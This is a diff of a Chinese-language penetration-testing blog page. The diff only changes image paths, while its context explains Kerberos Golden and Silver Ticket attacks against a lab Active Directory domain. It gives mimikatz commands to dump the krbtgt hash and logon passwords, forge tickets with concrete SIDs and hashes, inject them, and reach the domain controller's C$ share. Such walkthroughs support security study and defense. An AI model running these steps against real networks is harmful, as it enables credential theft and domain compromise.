@@ -8462,7 +8462,7 @@ Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.
 <h3 id="金票-GoldenTicket"><a href="#金票-GoldenTicket" class="headerlink" title="(金票)GoldenTicket"></a>(金票)GoldenTicket</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>​        <strong>Golden Ticket</strong>（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p>
 <p>​        每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,</p>
 <p>​        对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p>
-<p><img src="https://wooyun.js.org/images_result/images/2016011804523676070160.png" alt="Alt text"></p>
+<p><img src="2016011804523676070160.png" alt="Alt text"></p>
 <h5 id="黄金票据特点"><a href="#黄金票据特点" class="headerlink" title="黄金票据特点"></a>黄金票据特点</h5><ul>
 <li>域控制器中的KDC服务不验证TGT中的用户帐户，直到<a href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html" target="_blank" rel="noopener">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li>
 <li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li>
@@ -8489,25 +8489,25 @@ Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.
 <figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/OWA2010SP3.0day.org /</span><span class="string">user:</span>krbtgt</span><br></pre></td></tr></table></figure>
 
 <p>命令获取krbtgt的值。</p>
-<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566542295163.png" alt=""></p>
+<p><img src="1566542295163.png" alt=""></p>
 <h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p>​        得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p>
 <p>参数说明：</p>
 <figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/admin</span>：伪造的用户名</span><br><span class="line"><span class="string">/domain</span>：域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，注意是去掉最后一个-后面的值</span><br><span class="line"><span class="string">/krbtgt</span>：krbtgt的HASH值</span><br><span class="line"><span class="string">/ticket</span>：生成的票据名称</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /krbtgt:<span class="number">36f</span>9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566543225966.png" alt=""></p>
+<p><img src="1566543225966.png" alt=""></p>
 <h5 id="3-导入伪造Golden-Ticket获得域控权限"><a href="#3-导入伪造Golden-Ticket获得域控权限" class="headerlink" title="3.  导入伪造Golden Ticket获得域控权限"></a><strong>3.  导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::<span class="built_in">list</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566542805439.png" alt=""></p>
+<p><img src="1566542805439.png" alt=""></p>
 <p>此时就可以通过dir成功访问域控的共享文件夹。</p>
 <figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dir <span class="symbol">\\</span>OWA2010SP3.0day.org<span class="symbol">\c</span>$</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CVideos%5C1566543260644.png" alt=""></p>
+<p><img src="1566543260644.png" alt=""></p>
 <p><strong>TIPS:</strong></p>
 <p>​    生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash<br>可以用<strong>mimikatz “lsadump::lsa /patch”</strong>导出:</p>
-<p><img src="https://images2017.cnblogs.com/blog/1049983/201712/1049983-20171227215506456-245748150.png" alt="img"></p>
+<p><img src="1049983-20171227215506456-245748150.png" alt="img"></p>
 <h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
 <li>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</li>
 <li>可以伪造任意用户，即使其不存在。</li>
@@ -8519,9 +8519,9 @@ Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.
 </ul>
 <h3 id="银票-SilverTickets"><a href="#银票-SilverTickets" class="headerlink" title="(银票)SilverTickets"></a>(银票)SilverTickets</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​        Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p>
 <p><strong>正确的认证流程:</strong></p>
-<p><img src="https://wooyun.js.org/images_result/images/20160118045254154911118.png" alt="Alt text"></p>
+<p><img src="20160118045254154911118.png" alt="Alt text"></p>
 <p><strong>使用了Silver Ticke的认证流程:</strong></p>
-<p><img src="https://wooyun.js.org/images_result/images/20160118045256924591213.png" alt="Alt text"></p>
+<p><img src="20160118045256924591213.png" alt="Alt text"></p>
 <h5 id="白银票据的特点"><a href="#白银票据的特点" class="headerlink" title="白银票据的特点"></a>白银票据的特点</h5><ul>
 <li>.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li>
 <li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li>
@@ -8541,18 +8541,18 @@ Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.
 
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 
-<p>![](C:\Users\尚慧亮\Pictures\Camera Roll\1566649973247.png)</p>
+<p><img src="1566649973247.png" alt=""></p>
 <h5 id="2-伪造白银票据"><a href="#2-伪造白银票据" class="headerlink" title="2.伪造白银票据"></a>2.伪造白银票据</h5><p>这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。</p>
 <p>参数说明：</p>
 <figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/domain</span>：当前域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，和金票一样取前面一部分</span><br><span class="line"><span class="string">/target</span>：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line"><span class="string">/service</span>：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line"><span class="string">/rc4</span>：目标主机的HASH值</span><br><span class="line"><span class="string">/user</span>：伪造的用户名</span><br><span class="line"><span class="string">/ptt</span>：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用<span class="string">/ticket</span>导出之后再使用kerberos:<span class="function">:ptt</span>来导入</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /target:OWA2010SP3<span class="number">.0</span>day.org /service:cifs /rc4:<span class="number">125445</span>ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure>
 
-<p>![](C:\Users\尚慧亮\Pictures\Camera Roll\1566654188946.png)</p>
+<p><img src="1566654188946.png" alt=""></p>
 <p>这时通过klist查看当前会话的kerberos票据可以看到生成的票据。</p>
-<p>![](C:\Users\尚慧亮\Pictures\Camera Roll\1566654225879.png)</p>
+<p><img src="1566654225879.png" alt=""></p>
 <p>使用<code>dir \\OWA2010SP3.0day.org\c$</code>访问DC的共享文件夹。</p>
-<p>![](C:\Users\尚慧亮\Pictures\Camera Roll\1566654265383.png)</p>
+<p><img src="1566654265383.png" alt=""></p>
 <h4 id="各种服务中的示例"><a href="#各种服务中的示例" class="headerlink" title="各种服务中的示例"></a>各种服务中的示例</h4><table>
 <thead>
 <tr>
